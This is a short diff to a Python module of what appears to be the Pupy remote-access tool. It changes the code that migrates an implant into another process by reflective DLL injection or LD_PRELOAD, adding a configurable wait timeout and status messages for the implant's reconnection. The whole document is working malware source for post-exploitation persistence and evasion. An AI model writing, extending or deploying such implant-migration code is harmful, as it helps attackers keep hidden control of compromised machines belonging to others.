@@ -3,6 +3,7 @@ import time
 import gzip, cStringIO
 import random
 import string
+import rpyc
 
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
@@ -35,15 +36,18 @@ def get_payload(module, compressed=True):
 
     return dllgzbuf.getvalue()
 
-def wait_connect(module, pid):
+def wait_connect(module, pid, timeout=10):
     module.success("waiting for a connection from the DLL ...")
-    for x in xrange(10):
+    for x in xrange(timeout):
         c = has_proc_migrated(module.client, pid)
         if c:
             module.success("got a connection from migrated DLL !")
             c.pupsrv.move_id(c, module.client)
+            time.sleep(0.5)
             try:
+                module.success("exiting old connection")
                 module.client.conn.exit()
+                module.success("exited old connection")
             except Exception:
                 pass
 
@@ -67,7 +71,9 @@ def ld_preload(module, command, wait_thread=False, keep=False):
     if not keep:
         wait_connect(module, pid)
 
-def migrate(module, pid, keep=False):
+    module.success("migration completed")
+
+def migrate(module, pid, keep=False, timeout=10):
     payload = get_payload(module)
 
     r = module.client.conn.modules['pupy'].reflective_inject_dll(
@@ -81,4 +87,6 @@ def migrate(module, pid, keep=False):
         return
 
     if not keep:
-        wait_connect(module, pid)
+        wait_connect(module, pid, timeout=timeout)
+
+    module.success("migration completed")
